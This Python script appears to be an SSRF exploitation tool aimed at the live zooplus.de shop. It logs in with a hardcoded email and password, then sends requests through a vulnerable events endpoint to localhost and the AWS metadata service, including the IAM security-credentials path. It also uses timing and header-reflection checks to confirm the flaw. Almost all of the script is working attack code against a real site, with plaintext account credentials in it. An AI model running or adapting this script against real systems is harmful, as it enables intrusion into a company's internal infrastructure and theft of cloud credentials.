#!/usr/bin/env python3
"""Test all 4 methods in detail with full logging"""
import requests
import json
import re
import urllib.parse
import time
from datetime import datetime
import urllib3
import os
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

os.makedirs("logs", exist_ok=True)
log_file = f"logs/all_methods_detailed_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"

print("="*70)
print("DETAILED TESTING OF ALL 4 METHODS")
print("="*70)

all_results = {
    "timestamp": datetime.now().isoformat(),
    "vulnerable_endpoint": f"{base}{ssrf_endpoint}",
    "methods": []
}

# ============================================================================
# METHOD 1: Custom Internal Header
# ============================================================================
print("\n[1] METHOD 1: Custom Internal Header Test")
print("-" * 70)

method1_result = {
    "method": 1,
    "name": "custom_internal_header",
    "description": "Send custom header to internal service and check if it's reflected"
}

try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://127.0.0.1:8080",
        "headers": {"X-Internal-Test": "SSRF-POC-2025"}
    }, timeout=10, verify=False)
    
    method1_result["status_code"] = resp.status_code
    method1_result["response"] = resp.text[:200]
    method1_result["all_headers"] = dict(resp.headers)
    
    found_headers = []
    for key, value in resp.headers.items():
        key_lower = key.lower()
        if any(x in key_lower for x in ['x-internal-test', 'x-request-id', 'x-trace-id', 'x-correlation-id', 'server']):
            found_headers.append((key, value))
            print(f"  ✅ FOUND HEADER: {key}: {value}")
    
    method1_result["found_headers"] = dict(found_headers) if found_headers else {}
    
    if found_headers:
        method1_result["success"] = True
        method1_result["proof"] = "Internal header reflected - 100% proof"
        print(f"  [SUCCESS] Method 1 works! Found {len(found_headers)} internal headers")
    else:
        method1_result["success"] = False
        method1_result["proof"] = "No internal headers found"
        print(f"  [INFO] No internal headers found")
        
except Exception as e:
    method1_result["error"] = str(e)
    method1_result["success"] = False
    print(f"  [ERROR] {e}")

all_results["methods"].append(method1_result)

# ============================================================================
# METHOD 2: Custom User-Agent Reflection
# ============================================================================
print("\n[2] METHOD 2: Custom User-Agent Reflection Test")
print("-" * 70)

method2_result = {
    "method": 2,
    "name": "user_agent_reflection",
    "description": "Send custom User-Agent and check if it's reflected in response"
}

try:
    custom_ua = "SSRF-EXPLOIT-BY-PENTEST-2025"
    s2 = requests.Session()
    s2.headers.update({
        "User-Agent": custom_ua,
        "Accept": "*/*",
    })
    s2.cookies.update(s.cookies)
    
    resp = s2.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/meta-data/instance-id"
    }, timeout=10, verify=False)
    
    method2_result["status_code"] = resp.status_code
    method2_result["response"] = resp.text[:200]
    method2_result["all_headers"] = dict(resp.headers)
    method2_result["custom_user_agent"] = custom_ua
    
    # Check if custom UA appears in response or headers
    ua_in_response = custom_ua in resp.text
    ua_in_headers = custom_ua in str(resp.headers)
    
    method2_result["ua_in_response"] = ua_in_response
    method2_result["ua_in_headers"] = ua_in_headers
    
    if ua_in_response or ua_in_headers:
        method2_result["success"] = True
        method2_result["proof"] = "Custom User-Agent reflected - proof"
        print(f"  ✅ [SUCCESS] Custom User-Agent reflected!")
        if ua_in_response:
            print(f"      Found in response: {resp.text.find(custom_ua)}")
        if ua_in_headers:
            print(f"      Found in headers")
    else:
        method2_result["success"] = False
        method2_result["proof"] = "Custom User-Agent not reflected"
        print(f"  [INFO] Custom User-Agent not reflected")
        print(f"      Response: {resp.text[:100]}")
        print(f"      Headers checked: {list(resp.headers.keys())[:5]}")
        
except Exception as e:
    method2_result["error"] = str(e)
    method2_result["success"] = False
    print(f"  [ERROR] {e}")

all_results["methods"].append(method2_result)

# ============================================================================
# METHOD 3: Time-based Confirmation
# ============================================================================
print("\n[3] METHOD 3: Time-based Confirmation Test")
print("-" * 70)

method3_result = {
    "method": 3,
    "name": "time_based",
    "description": "Compare response times: internal service (fast) vs external service with delay (slow)"
}

try:
    # Test 1: Internal service (should be fast)
    print("  Testing internal service (169.254.169.254)...")
    start1 = time.time()
    resp1 = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/meta-data/instance-id"
    }, timeout=10, verify=False)
    time1 = (time.time() - start1) * 1000  # ms
    
    method3_result["internal_time_ms"] = time1
    method3_result["internal_status"] = resp1.status_code
    
    print(f"    Internal: {time1:.2f}ms, Status: {resp1.status_code}")
    
    # Test 2: External service with delay (should be slow)
    print("  Testing external service (httpbin.org/delay/5)...")
    start2 = time.time()
    resp2 = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "https://httpbin.org/delay/5"
    }, timeout=10, verify=False)
    time2 = (time.time() - start2) * 1000  # ms
    
    method3_result["external_time_ms"] = time2
    method3_result["external_status"] = resp2.status_code
    method3_result["difference_ms"] = time2 - time1
    
    print(f"    External: {time2:.2f}ms, Status: {resp2.status_code}")
    print(f"    Difference: {time2 - time1:.2f}ms")
    
    # If internal is much faster than external, it's proof
    if time1 < 200 and time2 > 3000:
        method3_result["success"] = True
        method3_result["proof"] = f"Time difference confirms SSRF: internal {time1:.2f}ms vs external {time2:.2f}ms"
        print(f"  ✅ [SUCCESS] Time difference confirms SSRF!")
        print(f"      Internal is {time2/time1:.1f}x faster than external")
    elif time1 < time2 and (time2 - time1) > 1000:
        method3_result["success"] = True
        method3_result["proof"] = f"Time difference suggests SSRF: {time2 - time1:.2f}ms difference"
        print(f"  ✅ [SUCCESS] Time difference suggests SSRF!")
    else:
        method3_result["success"] = False
        method3_result["proof"] = f"Time difference not significant: {time2 - time1:.2f}ms"
        print(f"  [INFO] Time difference not significant enough")
        print(f"      Both requests took similar time")
        
except Exception as e:
    method3_result["error"] = str(e)
    method3_result["success"] = False
    print(f"  [ERROR] {e}")

all_results["methods"].append(method3_result)

# ============================================================================
# METHOD 4: Get Real AWS Metadata Data
# ============================================================================
print("\n[4] METHOD 4: Get Real AWS Metadata Data Test")
print("-" * 70)

method4_result = {
    "method": 4,
    "name": "aws_metadata_data",
    "description": "Try to get actual IAM role name or instance ID from AWS metadata"
}

try:
    # Try different formats
    test_urls = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
    ]
    
    for test_url in test_urls:
        print(f"  Testing: {test_url}")
        
        # Try with different request formats
        payloads = [
            {"url": test_url},
            {"url": test_url, "method": "GET"},
            {"url": test_url, "method": "GET", "headers": {"Accept": "text/plain"}},
            {"url": test_url, "headers": {"Accept": "text/plain"}},
        ]
        
        for i, payload in enumerate(payloads):
            try:
                resp = s.post(f"{base}{ssrf_endpoint}", json=payload, timeout=10, verify=False)
                
                response_text = resp.text.strip()
                
                if response_text and response_text != "{}" and len(response_text) > 10:
                    if not response_text.startswith("<!DOCTYPE") and not response_text.startswith("<html"):
                        # Check if it looks like real data
                        if any(x in response_text.lower() for x in ['role', 'zooplus', 'prod', 'dev', 'i-', 'us-', 'eu-', 'ap-']):
                            method4_result["success"] = True
                            method4_result["proof"] = f"Got real AWS data: {response_text[:100]}"
                            method4_result["data"] = response_text
                            method4_result["url"] = test_url
                            method4_result["payload"] = payload
                            method4_result["status_code"] = resp.status_code
                            
                            print(f"  ✅ [SUCCESS] Got real AWS data!")
                            print(f"      URL: {test_url}")
                            print(f"      Data: {response_text[:100]}")
                            break
            except:
                pass
        
        if method4_result.get("success"):
            break
    
    if not method4_result.get("success"):
        method4_result["success"] = False
        method4_result["proof"] = "Blind SSRF - response not returned, but 200 status confirms SSRF works"
        print(f"  [INFO] Blind SSRF - response not returned")
        print(f"      But 200 status confirms SSRF works!")
        
except Exception as e:
    method4_result["error"] = str(e)
    method4_result["success"] = False
    print(f"  [ERROR] {e}")

all_results["methods"].append(method4_result)

# Save results
with open(log_file, "w", encoding="utf-8") as f:
    json.dump(all_results, f, indent=2, ensure_ascii=False)

# SUMMARY
print("\n" + "="*70)
print("SUMMARY - ALL METHODS")
print("="*70)

successful_methods = [m for m in all_results["methods"] if m.get("success")]
print(f"\n✅ Successful methods: {len(successful_methods)}/{len(all_results['methods'])}")

for method in all_results["methods"]:
    status = "✅ SUCCESS" if method.get("success") else "❌ NO PROOF"
    print(f"\nMethod {method['method']}: {method['name']}")
    print(f"  Status: {status}")
    print(f"  Proof: {method.get('proof', 'N/A')}")
    if method.get("found_headers"):
        print(f"  Found headers: {list(method['found_headers'].keys())}")
    if method.get("internal_time_ms"):
        print(f"  Times: internal={method['internal_time_ms']:.2f}ms, external={method['external_time_ms']:.2f}ms")

print(f"\n📁 Full results saved to: {log_file}")
print("="*70)





